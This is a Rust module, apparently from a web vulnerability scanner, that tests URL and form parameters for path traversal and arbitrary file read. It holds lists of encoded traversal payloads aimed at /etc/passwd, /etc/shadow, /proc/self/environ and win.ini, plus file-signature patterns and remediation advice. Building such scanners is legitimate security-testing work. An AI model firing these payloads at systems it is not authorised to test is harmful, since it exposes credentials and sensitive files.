//! 文件读取验证
//!
//! 验证任意文件读取 / 路径遍历漏洞的可利用性:
//! - Linux: /etc/passwd, /etc/hosts, /etc/hostname
//! - Windows: C:\Windows\win.ini, C:\Windows\System32\drivers\etc\hosts
//! - 检测响应体中的文件特征（如 root:x:0:、[fonts] 等）
//! - 支持 URL 参数、表单字段、请求头注入

use crate::engine::VerifyEngine;
use crate::types::*;

/// 文件读取验证器
pub struct FileReadVerifier {
    engine: VerifyEngine,
}

impl FileReadVerifier {
    pub fn new(engine: VerifyEngine) -> Self {
        Self { engine }
    }

    pub fn with_default_engine() -> Self {
        Self::new(VerifyEngine::with_default_config())
    }

    /// 验证参数的路径遍历/任意文件读取
    pub async fn verify(
        &self,
        url: &str,
        method: &str,
        param: &str,
        original_value: &str,
    ) -> VerifyResult {
        let mut result = VerifyResult::new(url.to_string(), VulnType::FileRead);
        result.severity = "critical".to_string();

        // 1. Linux 路径遍历 payload
        if let Some((payload, evidence)) = self.try_linux_payloads(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_file_request(url, method, param, &result.payload.clone().unwrap_or_default());
            result.fix_advice = Some(
                "禁止将用户输入拼接到文件路径；使用白名单文件 ID 映射；严格校验路径，禁止 .. 序列"
                    .to_string(),
            );
            return result;
        }

        // 2. Windows 路径遍历 payload
        if let Some((payload, evidence)) = self.try_windows_payloads(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_file_request(url, method, param, &result.payload.clone().unwrap_or_default());
            result.fix_advice = Some(
                "禁止将用户输入拼接到文件路径；使用白名单文件 ID 映射；严格校验路径，禁止 .. 序列"
                    .to_string(),
            );
            return result;
        }

        // 3. 绝对路径读取（非遍历，直接 /etc/passwd）
        if let Some((payload, evidence)) = self.try_absolute_paths(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_file_request(url, method, param, &result.payload.clone().unwrap_or_default());
            result.fix_advice = Some(
                "禁止将用户输入拼接到文件路径；使用白名单文件 ID 映射；使用 realpath 校验"
                    .to_string(),
            );
            return result;
        }

        result.status = VerifyStatus::NotVerified;
        result.evidence = "未检测到文件读取特征".to_string();
        result.request = build_file_request(url, method, param, original_value);
        result
    }

    /// 测试 Linux 路径遍历
    async fn try_linux_payloads(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        for payload in LINUX_PATH_TRAVERSAL_PAYLOADS {
            let req = build_file_request(url, method, param, payload);
            if let Ok(resp) = self.engine.send_request(&req).await {
                for (pattern, file_desc) in LINUX_FILE_PATTERNS {
                    if resp.body.contains(pattern) {
                        return Some((
                            payload.to_string(),
                            format!("读取到 Linux 敏感文件: {} (特征: '{}')", file_desc, pattern),
                        ));
                    }
                }
            }
        }
        None
    }

    /// 测试 Windows 路径遍历
    async fn try_windows_payloads(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        for payload in WINDOWS_PATH_TRAVERSAL_PAYLOADS {
            let req = build_file_request(url, method, param, payload);
            if let Ok(resp) = self.engine.send_request(&req).await {
                for (pattern, file_desc) in WINDOWS_FILE_PATTERNS {
                    if resp.body.contains(pattern) {
                        return Some((
                            payload.to_string(),
                            format!("读取到 Windows 敏感文件: {} (特征: '{}')", file_desc, pattern),
                        ));
                    }
                }
            }
        }
        None
    }

    /// 测试绝对路径读取
    async fn try_absolute_paths(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        for payload in ABSOLUTE_PATH_PAYLOADS {
            let req = build_file_request(url, method, param, payload);
            if let Ok(resp) = self.engine.send_request(&req).await {
                for (pattern, file_desc) in LINUX_FILE_PATTERNS {
                    if resp.body.contains(pattern) {
                        return Some((
                            payload.to_string(),
                            format!("绝对路径读取成功: {} (特征: '{}')", file_desc, pattern),
                        ));
                    }
                }
                for (pattern, file_desc) in WINDOWS_FILE_PATTERNS {
                    if resp.body.contains(pattern) {
                        return Some((
                            payload.to_string(),
                            format!("绝对路径读取成功: {} (特征: '{}')", file_desc, pattern),
                        ));
                    }
                }
            }
        }
        None
    }
}

/// 构造文件读取测试请求
fn build_file_request(url: &str, method: &str, param: &str, value: &str) -> VerifyRequest {
    let mut req = VerifyRequest::default();
    req.method = method.to_string();
    req.timeout_secs = 15;

    if method.eq_ignore_ascii_case("GET") {
        let parsed = url::Url::parse(url).ok();
        if let Some(mut parsed) = parsed {
            parsed.query_pairs_mut().clear().append_pair(param, value);
            req.url = parsed.to_string();
        } else {
            req.url = url.to_string();
        }
    } else {
        req.url = url.to_string();
        req.body = Some(format!("{}={}", param, value));
        req.headers.push((
            "Content-Type".to_string(),
            "application/x-www-form-urlencoded".to_string(),
        ));
    }
    req
}

/// Linux 路径遍历 payload
const LINUX_PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/proc/self/environ",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
];

/// Windows 路径遍历 payload
const WINDOWS_PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../windows/win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "\\\\?\\C:\\windows\\win.ini",
    "..%255c..%255c..%255cwindows%255cwin.ini",
];

/// 绝对路径 payload
const ABSOLUTE_PATH_PAYLOADS: &[&str] = &[
    "/etc/passwd",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/group",
    "/etc/shadow",
    "/proc/version",
    "/proc/cpuinfo",
    "/var/log/auth.log",
    "/var/log/messages",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\System32\\drivers\\etc\\lmhosts",
];

/// Linux 文件特征
const LINUX_FILE_PATTERNS: &[(&str, &str)] = &[
    ("root:x:0:0", "/etc/passwd"),
    ("root:x:0:0:root:/root:", "/etc/passwd (root 行)"),
    ("nobody:x:", "/etc/passwd (nobody 行)"),
    ("bin:x:1:1", "/etc/passwd (bin 行)"),
    ("daemon:x:", "/etc/passwd (daemon 行)"),
    ("127.0.0.1", "/etc/hosts"),
    ("localhost", "/etc/hosts"),
    ("::1", "/etc/hosts (IPv6 localhost)"),
    ("PATH=", "/proc/self/environ"),
    ("Linux version", "/proc/version"),
    ("processor", "/proc/cpuinfo"),
];

/// Windows 文件特征
const WINDOWS_FILE_PATTERNS: &[(&str, &str)] = &[
    ("[fonts]", "win.ini"),
    ("[extensions]", "win.ini"),
    ("[files]", "win.ini"),
    ("MAPI=1", "win.ini"),
    ("127.0.0.1", "hosts"),
    ("localhost", "hosts"),
    ("Microsoft", "hosts/win.ini"),
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_linux_payloads_not_empty() {
        assert!(!LINUX_PATH_TRAVERSAL_PAYLOADS.is_empty());
    }

    #[test]
    fn test_windows_payloads_not_empty() {
        assert!(!WINDOWS_PATH_TRAVERSAL_PAYLOADS.is_empty());
    }

    #[test]
    fn test_absolute_paths_not_empty() {
        assert!(!ABSOLUTE_PATH_PAYLOADS.is_empty());
    }

    #[test]
    fn test_linux_file_patterns_not_empty() {
        assert!(!LINUX_FILE_PATTERNS.is_empty());
        assert!(LINUX_FILE_PATTERNS.iter().any(|(p, _)| *p == "root:x:0:0"));
    }

    #[test]
    fn test_windows_file_patterns_not_empty() {
        assert!(!WINDOWS_FILE_PATTERNS.is_empty());
        assert!(WINDOWS_FILE_PATTERNS.iter().any(|(p, _)| p.contains("[fonts]")));
    }

    #[test]
    fn test_build_file_request_get() {
        let req = build_file_request(
            "http://example.com/download?file=report.pdf",
            "GET",
            "file",
            "../../../etc/passwd",
        );
        assert_eq!(req.method, "GET");
        assert!(req.url.contains("file="));
    }

    #[test]
    fn test_build_file_request_post() {
        let req = build_file_request(
            "http://example.com/download",
            "POST",
            "file",
            "..\\..\\..\\windows\\win.ini",
        );
        assert_eq!(req.method, "POST");
        assert!(req.body.is_some());
        assert!(req.headers.iter().any(|(k, _)| k == "Content-Type"));
    }

    #[test]
    fn test_linux_payloads_have_etc_passwd() {
        assert!(LINUX_PATH_TRAVERSAL_PAYLOADS.iter().any(|p| p.contains("etc/passwd")));
    }

    #[test]
    fn test_windows_payloads_have_win_ini() {
        assert!(WINDOWS_PATH_TRAVERSAL_PAYLOADS.iter().any(|p| p.contains("win.ini")));
    }

    #[test]
    fn test_url_encoded_payloads_present() {
        assert!(LINUX_PATH_TRAVERSAL_PAYLOADS.iter().any(|p| p.contains("%2e%2e")));
        assert!(WINDOWS_PATH_TRAVERSAL_PAYLOADS.iter().any(|p| p.contains("%5c")));
    }

    #[test]
    fn test_php_filter_payload_present() {
        assert!(LINUX_PATH_TRAVERSAL_PAYLOADS
            .iter()
            .any(|p| p.contains("php://filter")));
    }
}
